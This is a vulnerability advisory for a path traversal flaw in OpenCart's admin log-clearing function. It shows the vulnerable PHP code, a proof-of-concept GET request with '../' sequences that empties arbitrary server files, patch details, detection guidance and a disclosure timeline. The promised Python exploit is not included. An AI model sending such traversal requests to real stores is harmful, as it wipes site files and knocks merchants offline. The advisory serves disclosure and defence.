## Product Overview:[#](#product-overview)

Opencart is an open source ecommerce platform for online merchants to self-host and list their products for sale. It is structured in a way that allows for a quick setup and Opencart also provides a cloud solution for users who do not want to have an on-premise setup. Opencart is split into two fronts: a storefront containing a catalogue that regular users will access, as well as a backend administrative dashboard for management purposes. Account roles for the backend dashboard are highly customizable, allowing the owner of the website to initialise custom roles with different privileges and access, by using the fine-grained controls.

## Vulnerability Summary:[#](#vulnerability-summary)

There is a path traversal vulnerability at the Logs section of the backend dashboard, which allows an authenticated adversary to empty any existing file on the web server, given that there is write permissions on the file. By default, every OpenCart file is able to be emptied. This means that the availability of the website will be heavily impacted by emptying the core files, preventing regular functionality of the website. This vulnerability was introduced from [versions 4.0.0.0 onward](https://github.com/opencart/opencart/commit/23b9d53e4c903e1a33278c199b2013f2267881cb#diff-102e09e795272ef9414f0d1affbe6e193b95d5d0bd33b9f776515b1d112e428f) and patched in [version 4.0.2.3](https://github.com/opencart/opencart/commit/0a8dd91e385f70e42795380009fd644224c1bc97).

## Vulnerability Details:[#](#vulnerability-details)

A backend user with “access” and “modify” permissions on the “tool/log” setting is able to clear the logs of the website. When clearing the logs in a regular use case, a HTTP GET request is sent to delete the file “error.log”, by specifying it in the `filename` query parameter. The relevant code that is vulnerable can be found below:

```
// /admin/controller/tool/log.php
public function clear(): void {
    if (isset($this->request->get['filename'])) {
        $filename = (string)$this->request->get['filename']; // [1]
    } else {
        $filename = '';
    }
    $json = [];
    if (!$this->user->hasPermission('modify', 'tool/log')) {
        $json['error'] = $this->language->get('error_permission');
    }
    // DIR_LOGS = /system/storage/logs/
    $file = DIR_LOGS . $filename; // [2]
    if (!is_file($file)) {
        $json['error'] = sprintf($this->language->get('error_file'), $filename);
    }
    if (!$json) {
        $handle = fopen($file, 'w+'); // [3]
        fclose($handle);
        $json['success'] = $this->language->get('text_success');
    }
    // ...
}

```

At `[1]`, the filename is obtained from the incoming HTTP GET request and stored into the `$filename` PHP variable without any form of input sanitisation. At `[2]`, the file name is appended to the back of the storage log path `/system/storage/logs/` and stored into another variable `$file`. At `[3]`, the `$file` variable is used in a `fopen()` function call with the mode set to `w+`. This means that the existing file will have its content emptied. Since a file existence check occurs before this, it is not possible to create files that do not already exist.

In a normal scenario, the file `/system/storage/logs/error.log` will be emptied after the GET request is sent. However, since there is a lack of input sanitisation, it is possible for the `filename` query parameter to contain any number of path traversal sequence (`../`) to traverse out of the intended directory and point to other files instead. This results in other files being emptied and permanently affecting the website’s functionality.

## Exploit Conditions:[#](#exploit-conditions)

This vulnerability can be exploited when the attacker has a set of valid credentials to the backend dashboard with `access` and `modify` permissions on `tool/log`.

## Proof-of-Concept:[#](#proof-of-concept)

We have tried our best to make the PoC as portable as possible. This report includes a functional exploit written in Python3 that exploits the Path Traversal vulnerability.

The vulnerability can be exploited by sending a GET request to `https://TARGET_HOST/admin/index.php?route=tool/log.clear&user_token=<USER_TOKEN>&filename=../../../../../../tmp/PoC.txt`, for example:

```
GET /admin/index.php?route=tool/log.clear&filename=../../../../../../tmp/PoC.txt&user_token=4d6d604d8862798e96fe91846f28a36f HTTP/1.1
Host: TARGET_HOST
Cookie: OCSESSID=4f09deedf4a82f9c5b4bee9ec3;

```

Before running the exploit below, please ensure that you create a non-empty file `/tmp/PoC.txt` and that it has write permissions for the web user:

```
$ echo "Hello" > /tmp/PoC.txt
$ chmod 777 /tmp/PoC.txt
$ ls -la /tmp/PoC.txt
-rwxrwxrwx 1 root root 6 Apr 26 09:36 /tmp/PoC.txt

```

Then, run the exploit below:

## Suggested Mitigations:[#](#suggested-mitigations)

The patch [0a8dd91](https://github.com/opencart/opencart/commit/0a8dd91e385f70e42795380009fd644224c1bc97) addresses this vulnerability. It is recommended to apply this commit to your installation of OpenCart.

## Detection Guidance:[#](#detection-guidance)

It is possible to detect the exploitation of this vulnerability by checking the server’s access logs for all GET requests made to `/admin/index.php?route=tool/log.clear`, and filtering for requests that contain `../` in the `filename` query parameter.

## Timeline:[#](#timeline)

* 2022-09-06 Followed the security bug reporting [instructions](https://github.com/opencart/opencart#reporting-a-bug) and created an OpenCart forum account to try to report to the administrators, but new accounts are unable to send private messages.
* 2022-09-11 Email sent to `[[email protected]](/cdn-cgi/l/email-protection)` in an attempt to establish a proper communication channel with the project owner/maintainers.
* 2022-09-12 Support agent replied and suggested to describe the issue in a public channel via their GitHub Issues tracker, to which we reminded that it is a security bug on the latest version. Support agent then requested to send them the report where they will forward it to the developers. We instead requested for the public key of the developers so that the report can be encrypted to prevent information leakage. Support agent replied “they do not have such”.
* 2022-09-14 Tried the “Contact Us” form on OpenCart’s website. Ended up with a second support ticket being opened.
* 2022-09-15 Opened a GitHub Issue ([#12684](https://github.com/opencart/opencart/issues/12684)) in a last resort to establish a proper communication channel with the developers. Issue closed immediately by the project owner, and **marked as spam**.
* 2022-09-15 Email sent directly to `[[email protected]](/cdn-cgi/l/email-protection)` as it is used for GitHub commits.
* 2022-09-15 Project owner replied and we sent the bug report over.
* 2022-09-15 Bug fixed in commit [0a8dd91](https://github.com/opencart/opencart/commit/0a8dd91e385f70e42795380009fd644224c1bc97)
* 2023-09-18 Public Release
